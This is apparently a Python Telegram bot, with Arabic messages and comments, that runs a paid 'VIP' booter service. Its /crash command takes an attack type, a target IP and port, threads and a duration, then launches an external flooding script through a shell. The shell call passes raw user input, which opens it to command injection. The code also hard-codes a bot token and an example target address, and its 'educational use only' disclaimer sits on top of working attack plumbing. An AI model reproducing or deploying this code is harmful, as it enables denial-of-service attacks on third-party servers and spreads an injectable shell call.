import telebot
import os
import signal
import subprocess
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# التوكن الخاص بالبوت
TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
bot = telebot.TeleBot(TOKEN)

# قائمة المستخدمين المسموح لهم
ALLOWED_USERS = [1480248962]  # ضع هنا معرفات المستخدمين المسموح لهم باستعمال /crash و /addvip

# لتتبع العمليات النشطة
active_attacks = {}

# قائمة المستخدمين الـ VIP مع عدد الأيام
vip_users = {}

@bot.message_handler(commands=['start'])
def handle_start_command(message):
    try:
        user_id = message.from_user.id

        # رسالة الترحيب
        days_left = vip_users.get(user_id, 0)  # عدد الأيام المتبقية
        text = (
            f"🤖 *مرحبًا بك في البوت!*\n\n"
            f"✅ *حالتك:* {'VIP' if days_left > 0 else 'عادية'}\n"
            f"⏳ *عدد الأيام المتبقية:* {days_left} يوم(s)\n"
            f"📌 *للاستخدام:* /crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\n"
            f"💡 مثال:\n"
            f"/crash UDP 143.92.125.230:10013 10 900\n"
            f"⚠️ هذا البوت للاستخدام التعليمي فقط."
        )

        bot.send_message(message.chat.id, text, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

@bot.message_handler(commands=['addvip'])
def handle_addvip_command(message):
    try:
        # تحقق من الصلاحيات
        user_id = message.from_user.id
        if user_id not in ALLOWED_USERS:
            bot.reply_to(message, "🚫 ليس لديك صلاحيات لاستخدام هذا الأمر!")
            return

        # تحليل الأمر
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ الاستخدام الصحيح: /addvip <ID المستخدم> <عدد الأيام>")
            return

        target_user_id = int(command_parts[1])
        days = int(command_parts[2])

        # إضافة المستخدم إلى قائمة VIP
        vip_users[target_user_id] = days
        bot.reply_to(message, f"✅ تم إضافة {days} يوم(s) للمستخدم {target_user_id}.")
    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        user_id = message.from_user.id

        # تحقق إذا كان المستخدم VIP
        if vip_users.get(user_id, 0) <= 0:
            bot.reply_to(message, "🚫 عذرًا، يجب أن تكون VIP لاستخدام هذا الأمر!")
            return

        # تحليل الأمر
        command_parts = message.text.split()
        if len(command_parts) < 5:
            bot.reply_to(
                message,
                "⚠️ الاستخدام الصحيح:\n/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\n\nمثال:\n/crash UDP 143.92.125.230:10013 10 900"
            )
            return

        attack_type = command_parts[1]
        ip_port = command_parts[2]
        threads = command_parts[3]
        duration = command_parts[4]

        # تنفيذ الهجوم كعملية فرعية
        command = f'python3 start.py {attack_type} {ip_port} {threads} {duration}'
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
        
        # حفظ العملية في القائمة
        active_attacks[user_id] = process

        # الرد على المستخدم
        response = (
            "[✅] الهجوم تم تشغيله بنجاح [✅]\n\n"
            f"📍 الهدف: {ip_port}\n"
            f"⚙️ النوع: {attack_type}\n"
            f"🧵 الخيوط: {threads}\n"
            f"⏳ المدة: {duration}ms\n"
            "🔴 لإيقاف الهجوم، استخدم زر الإيقاف أدناه."
        )

        # زر إيقاف الهجوم
        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("إيقاف الهجوم", callback_data=f"stop_attack_{user_id}")
        markup.add(stop_button)

        bot.send_message(message.chat.id, response, reply_markup=markup)

    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_attack'))
def stop_attack(call):
    try:
        # استخراج معرف المستخدم من callback_data
        user_id = int(call.data.split("_")[2])

        # تحقق من وجود عملية للمستخدم
        if user_id not in active_attacks:
            bot.answer_callback_query(call.id, "لا توجد عملية نشطة لهذا المستخدم!")
            return

        # الحصول على العملية وإيقافها
        process = active_attacks[user_id]
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # إيقاف العملية بالكامل

        # إزالة العملية من القائمة
        del active_attacks[user_id]

        # إشعار بالإيقاف
        bot.answer_callback_query(call.id, "تم إيقاف الهجوم بنجاح!")
        bot.send_message(call.message.chat.id, "🛑 الهجوم تم إيقافه بنجاح.")
    except Exception as e:
        bot.answer_callback_query(call.id, f"صارت مشكلة: {str(e)}")
        bot.send_message(call.message.chat.id, f"صارت مشكلة: {str(e)}")

# تشغيل البوت
print("بوت تليجرام يعمل...")
bot.polling()
